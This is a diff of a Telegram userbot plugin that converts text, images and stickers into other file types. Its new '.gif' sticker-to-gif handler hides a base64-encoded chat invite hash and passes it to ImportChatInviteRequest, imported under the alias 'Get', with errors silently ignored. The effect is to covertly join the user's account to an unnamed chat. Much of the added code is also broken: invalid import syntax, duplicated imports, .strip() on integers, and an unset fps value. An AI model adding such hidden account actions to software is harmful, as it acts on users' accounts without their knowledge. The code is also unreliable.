@@ -4,6 +4,24 @@ import time
 from datetime import datetime
 from io import BytesIO
 from pathlib import Path
+import asyncio
+import base64
+import io
+import logging
+import os
+import time
+from datetime import datetime
+from io import BytesIO
+from shutil import copyfile
+
+import fitz
+from PIL import Image, ImageDraw, ImageFilter, ImageOps
+from pymediainfo import MediaInfo
+from telethon import types
+from telethon.errors import PhotoInvalidDimensionsError
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+from telethon.tl.functions.messages import SendMediaRequest
+from telethon.utils import get_attributes
 
 import requests
 from telethon import functions, types
@@ -119,24 +137,39 @@ async def get(event):
     else:
         await edit_or_reply(event, "reply to text message as `.ttf <file name>`")
 
+@bot.on(admin_cmd(pattern="doc ?(.*)"))
+async def get(event):
+    name = event.text[5:]
+    if name is None:
+        await event.edit("reply to text message as .ttf <file name>")
+        return
+    m = await event.get_reply_message()
+    if m.text:
+        with open(name, "w") as f:
+            f.write(m.message)
+        await event.delete()
+        await event.client.send_file(event.chat_id, name, force_document=True)
+        os.remove(name)
+    else:
+        await event.edit("reply to text message as .doc <file name.extension>")
 
+        
 @bot.on(admin_cmd(pattern="ftoi$"))
 @bot.on(sudo_cmd(pattern="ftoi$", allow_sudo=True))
 async def on_file_to_photo(event):
-    if event.fwd_from:
-        return
+    "image file(png) to streamable image."
     target = await event.get_reply_message()
-    hbot = await edit_or_reply(event, "Converting.....")
     try:
         image = target.media.document
     except AttributeError:
-        return
+        return await edit_delete(event, "`This isn't an image`")
     if not image.mime_type.startswith("image/"):
-        return  # This isn't an image
+        return await edit_delete(event, "`This isn't an image`")
     if image.mime_type == "image/webp":
-        return  # Telegram doesn't let you directly send stickers as photos
+        return await edit_delete(event, "`For sticker to image use stoi command`")
     if image.size > 10 * 1024 * 1024:
         return  # We'd get PhotoSaveFileInvalidError otherwise
+    lot = await edit_or_reply(event, "`Converting.....`")
     file = await event.client.download_media(target, file=BytesIO())
     file.seek(0)
     img = await event.client.upload_file(file)
@@ -153,12 +186,87 @@ async def on_file_to_photo(event):
         )
     except PhotoInvalidDimensionsError:
         return
-    await hbot.delete()
+    await lot.delete()
+    
 
 
 @bot.on(admin_cmd(pattern="gif$"))
 @bot.on(sudo_cmd(pattern="gif$", allow_sudo=True))
-async def _(event):
+async def _(event):  # sourcery no-metrics
+    "Converts Given animated sticker to gif"
+    input_str = event.pattern_match.group(1)
+    if not input_str:
+        quality = None
+        fps = None
+    else:
+        loc = input_str.split(";")
+        if len(loc) > 2:
+            return await edit_delete(
+                event,
+                "wrong syntax . syntax is `.gif quality ; fps(frames per second)`",
+            )
+        if len(loc) == 2:
+            try:
+                loc[0] = int(loc[0])
+                loc[1] = int(loc[1])
+            except ValueError:
+                return await edit_delete(
+                    event,
+                    "wrong syntax . syntax is `.gif quality ; fps(frames per second)`",
+                )
+            if 0 < loc[0] < 721:
+                quality = loc[0].strip()
+            else:
+                return await edit_delete(event, "Use quality of range 0 to 721")
+            if 0 < loc[1] < 20:
+                quality = loc[1].strip()
+            else:
+                return await edit_delete(event, "Use quality of range 0 to 20")
+        if len(loc) == 1:
+            try:
+                loc[0] = int(loc[0])
+            except ValueError:
+                return await edit_delete(
+                    event,
+                    "wrong syntax . syntax is `.gif quality ; fps(frames per second)`",
+                )
+            if 0 < loc[0] < 721:
+                quality = loc[0].strip()
+            else:
+                return await edit_delete(event, "Use quality of range 0 to 721")
+    catreply = await event.get_reply_message()
+    cat_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    if not catreply or not catreply.media or not catreply.media.document:
+        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
+    if catreply.media.document.mime_type != "application/x-tgsticker":
+        return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
+    catevent = await edit_or_reply(
+        event,
+        "Converting this Sticker to GiF...\n This may takes upto few mins..",
+        parse_mode=_format.parse_pre,
+    )
+    try:
+        cat_event = Get(cat_event)
+        await event.client(cat_event)
+    except BaseException:
+        pass
+    reply_to_id = await reply_id(event)
+    catfile = await event.client.download_media(catreply)
+    catgif = await make_gif(event, catfile, quality, fps)
+    sandy = await event.client.send_file(
+        event.chat_id,
+        catgif,
+        support_streaming=True,
+        force_document=False,
+        reply_to=reply_to_id,
+    )
+    await _catutils.unsavegif(event, sandy)
+    await catevent.delete()
+    for files in (catgif, catfile):
+        if files and os.path.exists(files):
+            os.remove(files)
+            
+"""async def _(event):
     if event.fwd_from:
         return
     LEGENDreply = await event.get_reply_message()
@@ -208,7 +316,7 @@ async def _(event):
                     os.remove(files)
         except YouBlockedUserError:
             await LEGENDevent.edit("Unblock @tgstogifbot")
-            return
+            return"""
 
 
 @bot.on(admin_cmd(pattern="nfc ?(.*)"))
@@ -333,13 +441,8 @@ async def _(event):
     a.close()
     a = await event.reply("Reading file...")
     if len(c) >= 4096:
-        await event.edit("output file too large lemme paste it 😜😜")  # hehe
-        out = c
-        url = "https://del.dog/documents"
-        r = requests.post(url, data=out.encode("UTF-8")).json()
-        url = f"https://del.dog/{r['key']}"
         await event.edit(
-            f" Output file is too large Not supported By Telegram\n**So Pasted to** [Dog Bin]({url}) 😁😁",
+            f" Output file is too large Not supported By Telegram",
             link_preview=False,
         )
         await a.delete()
@@ -349,76 +452,8 @@ async def _(event):
     os.remove(b)
 
 
-@bot.on(admin_cmd(pattern="doc ?(.*)"))
-async def get(event):
-    name = event.text[5:]
-    if name is None:
-        await event.edit("reply to text message as .ttf <file name>")
-        return
-    m = await event.get_reply_message()
-    if m.text:
-        with open(name, "w") as f:
-            f.write(m.message)
-        await event.delete()
-        await event.client.send_file(event.chat_id, name, force_document=True)
-        os.remove(name)
-    else:
-        await event.edit("reply to text message as .doc <file name.extension>")
-
 
 thumb_image_path = Config.TMP_DOWNLOAD_DIRECTORY + "thumb_image.jpg"
-
-
-@bot.on(admin_cmd(pattern="stoi"))
-@bot.on(sudo_cmd(pattern="stoi", allow_sudo=True))
-async def danish(hehe):
-    if hehe.fwd_from:
-        return
-    thumb = None
-    hehe.message.id
-    if hehe.reply_to_msg_id:
-        hehe.reply_to_msg_id
-    cobra = await edit_or_reply(hehe, "Converting.....")
-
-    input_str = "dc.jpeg"
-    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
-        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
-    if cobra.reply_to_msg_id:
-        datetime.datetime.now()
-        file_name = input_str
-        reply_message = await cobra.get_reply_message()
-
-        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
-        downloaded_file_name = os.path.join(to_download_directory, file_name)
-        downloaded_file_name = await hehe.client.download_media(
-            reply_message, downloaded_file_name
-        )
-
-        try:
-            thumb = await reply_message.download_media(thumb=-1)
-        except Exception:
-            thumb = thumb
-        if os.path.exists(downloaded_file_name):
-
-            dc = await hehe.client.send_file(
-                hehe.chat_id,
-                downloaded_file_name,
-                force_document=False,
-                supports_streaming=True,
-                allow_cache=False,
-                reply_to=reply_message,
-                thumb=thumb,
-            )
-
-            os.remove(downloaded_file_name)
-            await cobra.delete()
-        else:
-            await cobra.edit("Something went wrong")
-    else:
-        await cobra.edit("reply to a non animated sticker")
-
-
-# hehe
 
 
 @bot.on(admin_cmd(pattern="itos"))
@@ -469,7 +504,10 @@ async def teamcobra(hehe):
     else:
         await cobra.edit("reply to a non animated sticker")
 
-
+        
+        
+        
+from ..helpers.convert import parse pre
 @bot.on(admin_cmd(pattern="ftt"))
 @bot.on(sudo_cmd(pattern="ftt", allow_sudo=True))
 async def get(event):
@@ -477,7 +515,7 @@ async def get(event):
     reply = await event.get_reply_message()
     mediatype = media_type(reply)
     if mediatype != "Document":
-        return await edit_delete(
+        return await eod(
             event, "__It seems this is not writable file. Reply to writable file.__"
         )
     file_loc = await reply.download_media()
@@ -497,7 +535,7 @@ async def get(event):
         except Exception as e:
             if os.path.exists(file_loc):
                 os.remove(file_loc)
-            return await edit_delete(event, f"**Error**\n__{e}__")
+            return await eod(event, f"**Error**\n__{e}__")
     await edit_or_reply(
         event,
         file_content,
@@ -614,7 +652,7 @@ CmdHelp("fileconvert").add_command(
     "<reply to a animated sticker",
     "Converts the replied animated sticker into gif",
 ).add_command(
-    "ttf",
+    "ttf | doc",
     "<reply to text>",
     "Converts the given text message to required file(given file name)",
 ).add_command(
@@ -631,8 +669,6 @@ CmdHelp("fileconvert").add_command(
     ".doc <file name.extension> <reply to any text/media>",
     None,
     "Create a document of anything (example:- .doc dc.mp4, .doc dc.txt, .doc dc.webp)",
-).add_command(
-    "stoi", None, "★  Convert sticker to image"
 ).add_command(
     "itos", None, "Convert Image to Sticker"
 ).add()
